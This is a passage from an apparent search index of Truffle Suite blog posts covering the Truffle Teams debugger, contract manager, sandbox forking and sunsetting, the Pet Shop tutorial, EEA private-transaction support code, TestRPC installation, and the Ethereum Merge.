debugging experience. Check out the Truffle Teams debugger docs to learn more about breakpoints. Currently the debugger in Truffle Teams only works for sandbox environments, but we plan on supporting public networks next! The Truffle Teams Debugger--now with syntax highlighting and breakpoints! ## The Contract Manager Note : To use the contract manager right away, you'll need to opt-in to Truffle Teams Early Access . Truffle Teams\u2019 Contract Manager generates a UI for interacting with all the functions of your smart contracts, as well as a live state tree so you can quickly see the changes propagated by those functions. If you\u2019re familiar with Remix, you\u2019ll feel right at home here. The Contract Manager; shown here using an NFT badge. The Contract Manager is great for quick demos, integration tests, and a faster, all-GUI debugging workflow. For example, you can deploy to a sandbox via the deployment wizard, hop over to the contract manager to fire off a few transactions, and finally debug these transactions from the monitoring screen. ## Dapp Topography Going forward, we\u2019ll be helping you understand your dapp on an even deeper level, offering forensic-level analysis of your transactions. Not only that, but it will be able to diagram contract interaction to allow different stakeholders to participate in the debugging process. For example a product manager, or other domain expert can participate in the forensic analysis. These diagrams and other assets can be shareable media that can fit into existing communication channels. A test in which a user who isn't the owner of an ENS name attempt to change the resolver. Note the \"X\" shoing the revert. ## Get Started with Truffle Teams We want Truffle Teams to be the most effective DevOps tool in the blockchain space for both new and existing teams. Check out Truffle Teams today and let us know what you think about the new deployment views and contract manager, or if your team has other needs we haven\u2019t met yet. SIGN UP FOR THE TRUFFLE TEAMS TRUFFLE TEAMS QUICKSTART Thanks! _Josh Quintal, Head of Product & Marketing_", "title": "Debugger Enhancements"}, {"location": "blog/learn-ethereum-the-fun-way-with-our-pet-shop-tutorial/", "text": "Here at Truffle we want to make Ethereum development accessible to developers of all stripes. To that end, today we're releasing a new tutorial called Pet Shop . It covers the entire local development process, start to finish. For added fun, we've tied the whole thing together within the narrative of creating a pet adoption dapp for a local pet shop owner. Here's a preview of what's covered: Setting up The Development Environment Creating a Truffle Project using a Truffle Box Writing and Testing a Smart Contract Creating a UI to Interact with our Smart Contract By then end of the tutorial you'll have a shiny new dapp with which you can reserve pets for adoption. In the future we'll be building on this tutorial with others such as deploying to live testnets and additional, more advanced functionality. We hope you enjoy and thank everyone for your support! Got stuck? The fastest way to get help is from our community GitHub Discussions channel , where hundreds of your fellow Trufflers congregate to answer your questions. Love it? Send us your feedback on Twitter . Found a problem? Let us know by raise a GitHub issue if there's something you think we can improve! Pull requests are always welcome! Cheers! -- Josh & the Truffle Team", "title": "Learn Ethereum The Fun Way with our Pet Shop Tutorial"}, {"location": "blog/one-hundred-documentation-pull-requests/", "text": "Greetings! The Truffle team has been growing over the course of the last year. From a single developer, we are now a team of five (soon to be even more), which means that we can spread the work around. As a new full-time member of the team, I've first taken to looking at our existing materials to ensure that everything is up-to-date and working well. For example, our website, a public GitHub repository, had been receiving pull requests (PRs) for the better part of a year, and they had been languishing for want of someone to go through them. We're not talking a few or even a dozen. We're talking almost 100 PRs . All I can say is: wow . I've been working in the open source software world for about a decade, and I've never seen so many people freely offering suggestions to documentation. As we all ruefully know, documentation can be first to go out of date and last to be updated, so knowing that our community is keeping such an eagle eye on even minute details says a lot. And I do mean minute details . When one of our tutorials wrote \"tag a stab\" instead of \"take a stab\", not less than ten of you took the time to submit pull requests telling us so. Take a stab indeed Make no mistake: this is good thing. I believe in the Broken Windows theory as it applies to documentation. We want to fix up the small things now so we can maintain the larger things more easily in the future. We have big plans for our content here, just like we have big plans for Truffle. (Check out the new features coming in Truffle 4 ( https://github.com/trufflesuite/truffle/releases/tag/v4.0.0-beta.0 )!) And note that we have since separated out the website source code to its own repository to make submissions easier for the community. I'm happy to be part of a community that cares about what we're doing, reducing the bar to developing Ethereum dapps, and making them delicious. As for your suggestions on how we can serve you even better? Please keep them coming. Submit a pull request to our documentation, reach out on Twitter , or let us know if there's something we can improve by raising a GitHub issue . Need help with something? Reach out on our community GitHub Discussions channel , where hundreds of your fellow Trufflers congregate to answer your questions. -- Mike & the Truffle team Mike Pumphrey is an Enterprise Trainer at ConsenSys working on the Truffle team. With over a dozen years of experience in documentation, support, and training, Mike is passionate about making technical concepts understandable to a wider audience. He believes that great software can only be great when people know how to use it, and is excited to be bringing clarity to a field as exciting and new as blockchain.", "title": "One hundred documentation pull requests? Yes please."}, {"location": "blog/open-call-for-contributions-truffle-pegasys-eea-private-transactions/", "text": "Open call for contributions by Truffle + PegaSys: EEA private transactions \u00b6 What's missing? \u00b6 In its current state, Truffle doesn't support EEA private transactions. Support for the web3js-eea library is needed for this to work and PegaSys has recently made an implementation of the v4.0 EEA specification. Why did this happen? \u00b6 The interface-adapter in Truffle\u2019s codebase doesn\u2019t provide an adapter for the EEA 4.0 client spec, therefore private transactions aren\u2019t working. The EEA client specification is a developing specification and Truffle has not yet implemented the EEA client specification around private transactions. PegaSys is providing an implementation of the specification for private transactions. Pegasys and Truffle are teaming up to ensure that Truffle supports the EEA JSON RPC API methods. What's the solution? \u00b6 PegaSys and Truffle have teamed up to make a single open call for contributions. This guest blog post is made by the PegaSys team and is to be posted on the Truffle blog and promoted by both teams in order to add code to Truffle codebase to add support for them. The solution involves using a Delegation pattern to help make that work. The location of the files to be modified can be found here: truffle/packages/interface-adapter/lib In short, when Truffle receives a transaction, it should determine if its a privateFor transaction. If so, it would delegate the rest of the business logic to the EEA library. If not, it should just continue processing the transaction with the original web3 methods. Also, it would be very useful to make sure this plays nicely with the getTransactionReceipt methods later in the chain of events. What to do Exactly? \u00b6 The initial process involves adding an EEA definition to the shim file. The web3-shim.ts file currently contains the overloads for the different interface definitions and their mappings. import { EthereumDefinition } from \"./ethereum-overloads\" ; import { QuorumDefinition } from \"./quorum-overloads\" ; import { FabricEvmDefinition } from \"./fabric-evm-overloads\" ; const initInterface = async ( web3Shim : Web3Shim ) => { const networkTypes : NetworkTypesConfig = new Map ( Object . entries ({ \"ethereum\" : EthereumDefinition , \"quorum\" : QuorumDefinition , \"fabric-evm\" : FabricEvmDefinition })); networkTypes . get ( web3Shim . networkType ). initNetworkType ( web3Shim ); } The initial import and mapping has been done in this fork . import { EthereumDefinition } from \"./ethereum-overloads\" ; import { EEADefinition } from \"./EEA-overloads\" ; import { QuorumDefinition } from \"./quorum-overloads\" ; import { FabricEvmDefinition } from \"./fabric-evm-overloads\" ; const initInterface = async ( web3Shim : Web3Shim ) => { const networkTypes : NetworkTypesConfig = new Map ( Object . entries ({ \"ethereum\" : EthereumDefinition , \"EEA\" : EEADefinition , \"quorum\" : QuorumDefinition , \"fabric-evm\" : FabricEvmDefinition })); networkTypes . get ( web3Shim . networkType ). initNetworkType ( web3Shim ); } The rest of the owl is to add the needed logic in the eea-overloads.ts file and the overrides variable for it to interact with the web3eeajs library . Who can do this? \u00b6 Anyone who'd like to try can very much do so we will gladly support any developer who wants to help out. But here are some recommended prerequisites: The Truffle codebase is mainly written in javascript , and this particular interface-adapter library we'll be looking at is written in typescript . So knowing some javascript is a must. It will definitely help if you've had some exposure and usage of the Truffle library. Nothing fancy, just using it for compiling and deploying contracts for example. Likewise, having some previous knowledge of the web3js library is going to prove quite helpful. All of the above somewhat describes a general dapp developer- so in other words; if you've already written a dapp before using Truffle, this contribution could be done by you. So what's in it for you? Two things: - You'll receive some \ud83d\ude0e PegaSys Swag! - We'll personally thank and credit you on stage at Trufflecon at my Permissioning Talk For more information or help on this contribution, contact Felipe from PegaSys , or write us on our gitter channel .", "title": "Open call for contributions by Truffle + PegaSys - EEA private transactions"}, {"location": "blog/open-call-for-contributions-truffle-pegasys-eea-private-transactions/#open-call-for-contributions-by-truffle-pegasys-eea-private-transactions", "text": "", "title": "Open call for contributions by Truffle + PegaSys: EEA private transactions"}, {"location": "blog/open-call-for-contributions-truffle-pegasys-eea-private-transactions/#whats-missing", "text": "In its current state, Truffle doesn't support EEA private transactions. Support for the web3js-eea library is needed for this to work and PegaSys has recently made an implementation of the v4.0 EEA specification.", "title": "What's missing?"}, {"location": "blog/open-call-for-contributions-truffle-pegasys-eea-private-transactions/#why-did-this-happen", "text": "The interface-adapter in Truffle\u2019s codebase doesn\u2019t provide an adapter for the EEA 4.0 client spec, therefore private transactions aren\u2019t working. The EEA client specification is a developing specification and Truffle has not yet implemented the EEA client specification around private transactions. PegaSys is providing an implementation of the specification for private transactions. Pegasys and Truffle are teaming up to ensure that Truffle supports the EEA JSON RPC API methods.", "title": "Why did this happen?"}, {"location": "blog/open-call-for-contributions-truffle-pegasys-eea-private-transactions/#whats-the-solution", "text": "PegaSys and Truffle have teamed up to make a single open call for contributions. This guest blog post is made by the PegaSys team and is to be posted on the Truffle blog and promoted by both teams in order to add code to Truffle codebase to add support for them. The solution involves using a Delegation pattern to help make that work. The location of the files to be modified can be found here: truffle/packages/interface-adapter/lib In short, when Truffle receives a transaction, it should determine if its a privateFor transaction. If so, it would delegate the rest of the business logic to the EEA library. If not, it should just continue processing the transaction with the original web3 methods. Also, it would be very useful to make sure this plays nicely with the getTransactionReceipt methods later in the chain of events.", "title": "What's the solution?"}, {"location": "blog/open-call-for-contributions-truffle-pegasys-eea-private-transactions/#what-to-do-exactly", "text": "The initial process involves adding an EEA definition to the shim file. The web3-shim.ts file currently contains the overloads for the different interface definitions and their mappings. import { EthereumDefinition } from \"./ethereum-overloads\" ; import { QuorumDefinition } from \"./quorum-overloads\" ; import { FabricEvmDefinition } from \"./fabric-evm-overloads\" ; const initInterface = async ( web3Shim : Web3Shim ) => { const networkTypes : NetworkTypesConfig = new Map ( Object . entries ({ \"ethereum\" : EthereumDefinition , \"quorum\" : QuorumDefinition , \"fabric-evm\" : FabricEvmDefinition })); networkTypes . get ( web3Shim . networkType ). initNetworkType ( web3Shim ); } The initial import and mapping has been done in this fork . import { EthereumDefinition } from \"./ethereum-overloads\" ; import { EEADefinition } from \"./EEA-overloads\" ; import { QuorumDefinition } from \"./quorum-overloads\" ; import { FabricEvmDefinition } from \"./fabric-evm-overloads\" ; const initInterface = async ( web3Shim : Web3Shim ) => { const networkTypes : NetworkTypesConfig = new Map ( Object . entries ({ \"ethereum\" : EthereumDefinition , \"EEA\" : EEADefinition , \"quorum\" : QuorumDefinition , \"fabric-evm\" : FabricEvmDefinition })); networkTypes . get ( web3Shim . networkType ). initNetworkType ( web3Shim ); } The rest of the owl is to add the needed logic in the eea-overloads.ts file and the overrides variable for it to interact with the web3eeajs library .", "title": "What to do Exactly?"}, {"location": "blog/open-call-for-contributions-truffle-pegasys-eea-private-transactions/#who-can-do-this", "text": "Anyone who'd like to try can very much do so we will gladly support any developer who wants to help out. But here are some recommended prerequisites: The Truffle codebase is mainly written in javascript , and this particular interface-adapter library we'll be looking at is written in typescript . So knowing some javascript is a must. It will definitely help if you've had some exposure and usage of the Truffle library. Nothing fancy, just using it for compiling and deploying contracts for example. Likewise, having some previous knowledge of the web3js library is going to prove quite helpful. All of the above somewhat describes a general dapp developer- so in other words; if you've already written a dapp before using Truffle, this contribution could be done by you. So what's in it for you? Two things: - You'll receive some \ud83d\ude0e PegaSys Swag! - We'll personally thank and credit you on stage at Trufflecon at my Permissioning Talk For more information or help on this contribution, contact Felipe from PegaSys , or write us on our gitter channel .", "title": "Who can do this?"}, {"location": "blog/preparing-for-the-merge-hear-from-our-truffle-engineers/", "text": "By Kingsley Arinze In a previous blog post , we discussed the Merge in detail, including how it upgrades Ethereum as we know it today. Check out the post to better understand and prepare for the Merge. Here, we expand on what the Merge means for us at Truffle and what we're doing to prepare for it. We spoke with our resident L2 experts, Kevin Weaver , Senior Blockchain Engineer, and Faina Shalts , Lead Blockchain Engineer, and our Lead Blockchain Engineer David Murdoch , who leads the Ganache team at Truffle. \u200b\u200bWhat is the Merge and how does it change Ethereum? \u00b6 Kevin Weaver, Senior Blockchain Engineer, Truffle: \u201c Since December 2020, the Ethereum network has encompassed two blockchains running in parallel: the original Proof-of-Work chain, and a new \u201cbeacon chain\u201d utilizing a Proof-of-Stake consensus mechanism. The Merge will be the moment these blockchains converge, combining the full history and functionality of the PoW chain with the cleaner, more efficient security of the PoS chain. After the Merge, Ethereum will no longer require burning massive amounts of energy to secure the network, thus reducing its total electrical consumption by about 99.95%. Given the majority of new ETH issued by the network goes toward paying miners\u2019 electrical bills, this drop in consumption allows for a similarly massive drop in the new issuance of ETH. The combination of this reduction and the fee burning mechanism introduced by EIP 1559 , the result will push ETH into becoming a deflationary asset. Importantly, this change is not being made for reasons of political or monetary idealism, but because the network simply no longer requires subsidizing its security with excessive monetary issuance.\u201d Is there a set date for the Merge to happen? \u00b6 Kevin Weaver, Senior Blockchain Engineer, Truffle: \u201cThe tentative date for the Merge is sometime during the week of Sept. 19, 2022. However, this date is subject to change based on the outcome of the Goerli testnet merge.\u201d What do Truffle users need to know/do ahead of the Merge? \u00b6 David Murdoch, Lead Blockchain Engineer, Truffle: \u201cThey probably don't need to do anything unless they run a node and/or validator. Everything will continue to work at the dApp layer as it does now. There are some changes, but 99.99% of use cases won't care or notice.\u201d Kevin Weaver, Senior Blockchain Engineer, Truffle: \u201cTrufflers do not need to take any actions to prepare for the Merge. The switch to PoS will involve changes at the level of the consensus mechanism, which underpins the application layer, but not on the application layer itself.\u201d What changes should users expect from Ganache? \u00b6 David on possible upgrades to the Ganache local Ethereum simulator: \u201cWe will need to add a few new block tags. We currently use \"latest\" , \"earliest\" , and \"pending\" . We may add \"safe\" , \"finalized\" , and probably \"unsafe\" to this list, though we aren't yet sure of the significance these will have outside of forking. The difficulty field and OPCODE will change, as well as a few other small changes to block headers. Almost everything else will be internal changes, most of which will be in the EVM layer. Some advanced users may care about changes to some OPCODEs, but those users will be few and far between.\u201d How does the Merge affect Layer 2s? \u00b6 Faina Shalts, Lead Blockchain Engineer, Truffle: \u201cLayer 2 protocols should work pretty seamlessly after the Merge. We are keeping an eye on developments in this area and are ready to make any necessary changes to Truffle as things progress.\u201d Kevin Weaver, Senior Blockchain Engineer, Truffle: \u201cSimilarly, since Layer 2 networks interface with Ethereum at the application layer, the Merge will not result in changes for Truffle engineers building on L2s.\u201d Onward to the Merge \u00b6 We are excited for the Merge and wanted to hear why our engineers are, too. Here\u2019s what they had to say: Kevin Weaver, Senior Blockchain Engineer, Truffle: \u201cThe complexity of the upgrade combined with the distributed nature of the core developer teams and a huge efficiency improvement will make the Merge an achievement of engineering different from anything before it. If Ethereum is truly a tool for building human coordination tools, then its first objective should be to do no harm to our habitat. By switching to a cleaner, greener consensus mechanism, Ethereum will become 99.95% more efficient in this mission. I believe the Merge will therefore result in a phase shift toward more positive narratives of NFTs, DeFi, DAOs, web3 and crypto at large\u201d Faina Shalts, Lead Blockchain Engineer, Truffle: \u201cThe Merge is a really exciting step toward the sustainability and scalability of the Ethereum ecosystem. I love that we work in an industry that values these goals! I can't wait to see the post-Merge world and see the innovative protocols that it leads to.\u201d David Murdoch, Lead Blockchain Engineer, Truffle: \u201cGetting the whole ecosystem to focus on anything else \ud83d\ude42\u201d As the Merge draws closer and closer, we plan to keep our users updated with the latest information, especially any updates on our suite of tools for builders. We hope these answers from some of the engineers at Truffle are able to provide some more clarity as to what we are doing in preparation for the Merge. Visit the Truffle website today to learn more about our suite of developer tools. If you have questions that you would like our team members to answer concerning the merge and how it impacts our products, feel free to start a discussion on our Github Discussions channel . Don't forget to follow us on Twitter for live announcements and updates. Here are a few more resources on the Merge: \u00b6 Infura weekly workshops The Merge and what it means for Truffle The Merge knowledge base The Latest Release of Hyperledger Besu Helps Test The Merge On Any Platform The Ethereum Community Needs You To Test The Merge", "title": "Preparing for the Merge, hear from our Truffle engineers"}, {"location": "blog/preparing-for-the-merge-hear-from-our-truffle-engineers/#what-is-the-merge-and-how-does-it-change-ethereum", "text": "Kevin Weaver, Senior Blockchain Engineer, Truffle: \u201c Since December 2020, the Ethereum network has encompassed two blockchains running in parallel: the original Proof-of-Work chain, and a new \u201cbeacon chain\u201d utilizing a Proof-of-Stake consensus mechanism. The Merge will be the moment these blockchains converge, combining the full history and functionality of the PoW chain with the cleaner, more efficient security of the PoS chain. After the Merge, Ethereum will no longer require burning massive amounts of energy to secure the network, thus reducing its total electrical consumption by about 99.95%. Given the majority of new ETH issued by the network goes toward paying miners\u2019 electrical bills, this drop in consumption allows for a similarly massive drop in the new issuance of ETH. The combination of this reduction and the fee burning mechanism introduced by EIP 1559 , the result will push ETH into becoming a deflationary asset. Importantly, this change is not being made for reasons of political or monetary idealism, but because the network simply no longer requires subsidizing its security with excessive monetary issuance.\u201d", "title": "\u200b\u200bWhat is the Merge and how does it change Ethereum?"}, {"location": "blog/preparing-for-the-merge-hear-from-our-truffle-engineers/#is-there-a-set-date-for-the-merge-to-happen", "text": "Kevin Weaver, Senior Blockchain Engineer, Truffle: \u201cThe tentative date for the Merge is sometime during the week of Sept. 19, 2022. However, this date is subject to change based on the outcome of the Goerli testnet merge.\u201d", "title": "Is there a set date for the Merge to happen?"}, {"location": "blog/preparing-for-the-merge-hear-from-our-truffle-engineers/#what-do-truffle-users-need-to-knowdo-ahead-of-the-merge", "text": "David Murdoch, Lead Blockchain Engineer, Truffle: \u201cThey probably don't need to do anything unless they run a node and/or validator. Everything will continue to work at the dApp layer as it does now. There are some changes, but 99.99% of use cases won't care or notice.\u201d Kevin Weaver, Senior Blockchain Engineer, Truffle: \u201cTrufflers do not need to take any actions to prepare for the Merge. The switch to PoS will involve changes at the level of the consensus mechanism, which underpins the application layer, but not on the application layer itself.\u201d", "title": "What do Truffle users need to know/do ahead of the Merge?"}, {"location": "blog/preparing-for-the-merge-hear-from-our-truffle-engineers/#what-changes-should-users-expect-from-ganache", "text": "David on possible upgrades to the Ganache local Ethereum simulator: \u201cWe will need to add a few new block tags. We currently use \"latest\" , \"earliest\" , and \"pending\" . We may add \"safe\" , \"finalized\" , and probably \"unsafe\" to this list, though we aren't yet sure of the significance these will have outside of forking. The difficulty field and OPCODE will change, as well as a few other small changes to block headers. Almost everything else will be internal changes, most of which will be in the EVM layer. Some advanced users may care about changes to some OPCODEs, but those users will be few and far between.\u201d", "title": "What changes should users expect from Ganache?"}, {"location": "blog/preparing-for-the-merge-hear-from-our-truffle-engineers/#how-does-the-merge-affect-layer-2s", "text": "Faina Shalts, Lead Blockchain Engineer, Truffle: \u201cLayer 2 protocols should work pretty seamlessly after the Merge. We are keeping an eye on developments in this area and are ready to make any necessary changes to Truffle as things progress.\u201d Kevin Weaver, Senior Blockchain Engineer, Truffle: \u201cSimilarly, since Layer 2 networks interface with Ethereum at the application layer, the Merge will not result in changes for Truffle engineers building on L2s.\u201d", "title": "How does the Merge affect Layer 2s?"}, {"location": "blog/preparing-for-the-merge-hear-from-our-truffle-engineers/#onward-to-the-merge", "text": "We are excited for the Merge and wanted to hear why our engineers are, too. Here\u2019s what they had to say: Kevin Weaver, Senior Blockchain Engineer, Truffle: \u201cThe complexity of the upgrade combined with the distributed nature of the core developer teams and a huge efficiency improvement will make the Merge an achievement of engineering different from anything before it. If Ethereum is truly a tool for building human coordination tools, then its first objective should be to do no harm to our habitat. By switching to a cleaner, greener consensus mechanism, Ethereum will become 99.95% more efficient in this mission. I believe the Merge will therefore result in a phase shift toward more positive narratives of NFTs, DeFi, DAOs, web3 and crypto at large\u201d Faina Shalts, Lead Blockchain Engineer, Truffle: \u201cThe Merge is a really exciting step toward the sustainability and scalability of the Ethereum ecosystem. I love that we work in an industry that values these goals! I can't wait to see the post-Merge world and see the innovative protocols that it leads to.\u201d David Murdoch, Lead Blockchain Engineer, Truffle: \u201cGetting the whole ecosystem to focus on anything else \ud83d\ude42\u201d As the Merge draws closer and closer, we plan to keep our users updated with the latest information, especially any updates on our suite of tools for builders. We hope these answers from some of the engineers at Truffle are able to provide some more clarity as to what we are doing in preparation for the Merge. Visit the Truffle website today to learn more about our suite of developer tools. If you have questions that you would like our team members to answer concerning the merge and how it impacts our products, feel free to start a discussion on our Github Discussions channel . Don't forget to follow us on Twitter for live announcements and updates.", "title": "Onward to the Merge"}, {"location": "blog/preparing-for-the-merge-hear-from-our-truffle-engineers/#here-are-a-few-more-resources-on-the-merge", "text": "Infura weekly workshops The Merge and what it means for Truffle The Merge knowledge base The Latest Release of Hyperledger Besu Helps Test The Merge On Any Platform The Ethereum Community Needs You To Test The Merge", "title": "Here are a few more resources on the Merge:"}, {"location": "blog/removing-installation-issues-continued-testrpc/", "text": "**Update**: Since this blog post was published, we have released [Ganache](/ganache) a personal blockchain and a replacement to the TestRPC. We have left this post unaltered, but we highly recommend checking out our [Ganache Quickstart](/docs/ganache/quickstart) page. If you've been following along, you'll know that we recently removed most if not all installation issues from Truffle . For us it was a pretty big deal: Installation issues were, by far, the number one issue plaguing new users on any platform. We thought our solution was novel, so we blogged about it, and the biggest reaction we received from users was, \"This is awesome, thank you! But can you do it for the TestRPC too?\" Well you asked, and today we delivered. The TestRPC has always been the sister application to Truffle, and for good reason. The TestRPC gives users a personal blockchain with which to develop, drastically lowering the barrier to entry of Ethereum development and removing the need for mining or dealing with real Ether. Developing on the TestRPC is an integral part of every Ethereum project, and it's usually the first blockchain deployed to in a professional Ethereum developer's workflow. We'll be blogging about the ideal Truffle workflow a bit later, but instead of waiting, you can just let Chris Hitchcott from Digix Global show you how it's done . (Thank you Chris, this was a great presentation.) Fixing installation issues on the TestRPC required the very same solution as fixing them on Truffle, so we won't go into detail here. However, I will say the solution worked even better for the TestRPC than it did for Truffle. This is because the bundle we were able to create didn't require any external dependencies, making the package that you install just a single download. When compared to the old installation, the experience is night and day. Getting the new version \u00b6 Like Truffle, we need you to put this version through its paces before we can release it as an official version, so we've released it in beta . To get the beta version, first uninstall the version of the TestRPC you currently have (because they'll conflict): $ npm uninstall -g ethereumjs-testrpc And now install the beta version: $ npm install -g ethereumjs-testrpc@beta (If you're on a Unix-based system, you may have to prefix the above commands with sudo .) You'll notice that the beta version installs instantly, quicker than you can say, \"Holy crap, this is awesome.\" So what's next? \u00b6 We have a lot of things planned for the TestRPC. We're not ready to officially announce everything just yet, but know that solving these installation issues is a stepping stone to providing you the best Ethereum development experience possible. Like creamy ganache filling is to a chocolate truffle, so is the TestRPC to the core of your workflow. So stay tuned. It's gonna be sweet. -- Tim & the Truffle Team", "title": "Removing installation issues, con't - TestRPC"}, {"location": "blog/removing-installation-issues-continued-testrpc/#getting-the-new-version", "text": "Like Truffle, we need you to put this version through its paces before we can release it as an official version, so we've released it in beta . To get the beta version, first uninstall the version of the TestRPC you currently have (because they'll conflict): $ npm uninstall -g ethereumjs-testrpc And now install the beta version: $ npm install -g ethereumjs-testrpc@beta (If you're on a Unix-based system, you may have to prefix the above commands with sudo .) You'll notice that the beta version installs instantly, quicker than you can say, \"Holy crap, this is awesome.\"", "title": "Getting the new version"}, {"location": "blog/removing-installation-issues-continued-testrpc/#so-whats-next", "text": "We have a lot of things planned for the TestRPC. We're not ready to officially announce everything just yet, but know that solving these installation issues is a stepping stone to providing you the best Ethereum development experience possible. Like creamy ganache filling is to a chocolate truffle, so is the TestRPC to the core of your workflow. So stay tuned. It's gonna be sweet. -- Tim & the Truffle Team", "title": "So what's next?"}, {"location": "blog/sandbox-forking-with-truffle-teams/", "text": "Sandboxes in Truffle Teams are the easiest way to setup a shared Ganache instance for the entire team. They integrate seamlessly with our deployments manager, and work locally as expected too: insert the mnemonic and RPC URL into your Truffle config or browser wallet and starting sending ether, deploying contracts, interacting via the console and more! We\u2019re not stopping there though. Today we\u2019re proud to introduce live network simulation via sandbox forking! Introducing Forking \u00b6 Forking allows a sandbox to act as a live network from a given block number. We take for granted in web2 that we can get test credentials and interact with an API that will map to our production environment, but in web3 this hasn\u2019t been so easy. With a forked sandbox you can transact, deploy, test, and debug against Mainnet without spending real Ether! Forking has been available since 2017 ( see this older tutorial ), but the requirement of a full archival node was a barrier for many. By adding this ability to Truffle Teams, you no longer need to worry about anything--just select a network and go. Here are some more specific examples: DeFi : Some DeFi protocols have testnet deployments that differ from their Mainnet counterparts for a variety of reasons. For dapp developers, this inconsistency presents a problem. You want to develop against the \u201creal\u201d protocol, but developing in production is terrible, especially when real ETH is at stake! With forking, you\u2019re free to simply fork Mainnet and deploy your dapp to an environment that translates to the live network. Testing : Ensuring your dapp integrates with another used to require getting those contracts, deploying them to your local test network or a live testnet (assuming there\u2019s no comparable testnet deployment already), then finally running your tests. With a forked sandbox your target dapp is already there, with its state. Want to test your CryptoKitty item? You can do it with your actual kitty! Security Analysis : Dynamic analysis, the process of executing code and data in real-time with the hope of finding issues during execution, has never been easier. With the ability to take control of any account on the given network and travel through time by selecting an older block, you can run attacks live and see exactly what went wrong. How to Create a Forked Sandbox \u00b6 A forked Mainnet sandbox. To fork a network, create a new sandbox and check the forking checkbox. From there, select a network and optionally provide a block number. Clicking CONFIRM will spin up a new Ganache instance forked from the given network and block. For more details, see our sandboxes documentation. You can now interact with this sandbox as you would the forked network. Using Ethereum Mainnet as an example: you can call out to Mainnet contracts, and send ETH to Mainnet addresses. START TESTING AGAINST PRODUCTION NETWORKS TODAY! How Will you Use Forking? \u00b6 We\u2019re very proud of this feature and think it\u2019s going to be a game-changer for the community. We\u2019re curious: how will you use forking? We want Truffle Teams to be the most effective devops tool in the blockchain space for both new and existing teams. Join our slack community and let us know what you think about this feature, and if your team has other needs we haven\u2019t met yet. Thank you! Josh Quintal, Head of Product & Marketing", "title": "Simulate Live Networks with Forked Sandboxes"}, {"location": "blog/sandbox-forking-with-truffle-teams/#introducing-forking", "text": "Forking allows a sandbox to act as a live network from a given block number. We take for granted in web2 that we can get test credentials and interact with an API that will map to our production environment, but in web3 this hasn\u2019t been so easy. With a forked sandbox you can transact, deploy, test, and debug against Mainnet without spending real Ether! Forking has been available since 2017 ( see this older tutorial ), but the requirement of a full archival node was a barrier for many. By adding this ability to Truffle Teams, you no longer need to worry about anything--just select a network and go. Here are some more specific examples: DeFi : Some DeFi protocols have testnet deployments that differ from their Mainnet counterparts for a variety of reasons. For dapp developers, this inconsistency presents a problem. You want to develop against the \u201creal\u201d protocol, but developing in production is terrible, especially when real ETH is at stake! With forking, you\u2019re free to simply fork Mainnet and deploy your dapp to an environment that translates to the live network. Testing : Ensuring your dapp integrates with another used to require getting those contracts, deploying them to your local test network or a live testnet (assuming there\u2019s no comparable testnet deployment already), then finally running your tests. With a forked sandbox your target dapp is already there, with its state. Want to test your CryptoKitty item? You can do it with your actual kitty! Security Analysis : Dynamic analysis, the process of executing code and data in real-time with the hope of finding issues during execution, has never been easier. With the ability to take control of any account on the given network and travel through time by selecting an older block, you can run attacks live and see exactly what went wrong.", "title": "Introducing Forking"}, {"location": "blog/sandbox-forking-with-truffle-teams/#how-to-create-a-forked-sandbox", "text": "A forked Mainnet sandbox. To fork a network, create a new sandbox and check the forking checkbox. From there, select a network and optionally provide a block number. Clicking CONFIRM will spin up a new Ganache instance forked from the given network and block. For more details, see our sandboxes documentation. You can now interact with this sandbox as you would the forked network. Using Ethereum Mainnet as an example: you can call out to Mainnet contracts, and send ETH to Mainnet addresses. START TESTING AGAINST PRODUCTION NETWORKS TODAY!", "title": "How to Create a Forked Sandbox"}, {"location": "blog/sandbox-forking-with-truffle-teams/#how-will-you-use-forking", "text": "We\u2019re very proud of this feature and think it\u2019s going to be a game-changer for the community. We\u2019re curious: how will you use forking? We want Truffle Teams to be the most effective devops tool in the blockchain space for both new and existing teams. Join our slack community and let us know what you think about this feature, and if your team has other needs we haven\u2019t met yet. Thank you! Josh Quintal, Head of Product & Marketing", "title": "How Will you Use Forking?"}, {"location": "blog/stack-tracing-with-truffle-test/", "text": "Truffle Test can now provide stacktraces when your transactions revert! This is still a little experimental, and it requires truffle test to recompile all your contracts, so you\u2019ll have to enable it with truffle test --stacktrace . Here\u2019s what the result looks like: truffle test --stacktrace The stacktrace continues seamlessly from the Javascript test into the Solidity contracts. It begins in the Javscript where the transaction was sent, continues through the contract that initially received the transaction, and finally ends in the contract where the revert occurred. These Solidity stacktraces will be printed both for reverted transactions sent during tests and for reverted deployments made during tests with Contract.new() . Stacktraces are not currently available for calls or gas estimates. Note that stacktraces are a Truffle Contract feature, and will not be available if transactions are sent by other means. What if we want a little more? Looking at the above example again, one of our stacktraces helpfully included a revert message, but the other did not. Wouldn\u2019t it be nice if it had one too? Let\u2019s try this again, but this time with --stacktrace-extra : --stacktrace-extra There we go! The --stacktrace-extra option, in addition to turning on stacktraces, additionally compiles your contracts with Solidity\u2019s debug mode, so you get more information about just why the transaction reverted. Of course, for more detailed analysis, you may want to use Truffle Debugger! But stacktraces in tests can give a good first view of why your transaction reverted. These testing options are still a little experimental, so it\u2019s possible some things may not work with them. But, in most cases, they should provide a quick helpful view into why your test transaction reverted! Thanks, Harry Altman --Debugger Engineer, Truffle Suite Click here for the release notes on GitHub", "title": "Stack Tracing with Truffle Test"}, {"location": "blog/sunsetting-truffle-teams/", "text": "N.B : we published an earlier version of this blogpost with an incorrect timeline. Truffle Teams will be sunset on September 10, 2021. After a 2 year long road, we're sunsetting Truffle Teams (effective September 10th, 2021). The journey began when Truffle was an independent company. It extended our reach from dapp development into dapp maintenance. We've gained valuable insights about the state of blockchain devops, the most desirable parts of our tools, and a new clarity around our core competencies. As an independent company, Truffle Teams was integral to building a business for the long-term, but it came with some costly tradeoffs. Over time the resources required to develop and maintain it were too great, taking time away from development of our open-source tools and eventually taking time away from supporting tasks like ecosystem engagement and development. This was unsustainable. Another important factor made this sunsetting possible: The acquisition of Truffle Suite by ConsenSys Software granted us greater supporting resources and freed us from monetary metrics. Which leads us to some good news! We are reaffirming our commitment to having the best-in-class open-source blockchain developer tools. What about paid subscribers? \u00b6 All active Pro and Enterprise tier users will receive a refund of 1 month and recurring billings will cease. If you don't see a refund within 5 days (Paddle's processing time), email us at truffle-teams@trufflesuite.com . What about my data? \u00b6 All user data will be deleted 30 days following the date of shut down (September 10th 2021). Be sure to request your data before this time, otherwise we'll be unable to guarantee recovery. If you would like a dump of your data, email us at truffle-teams@trufflesuite.com . All user data will be deleted on September 10th, 2021. Make sure to request 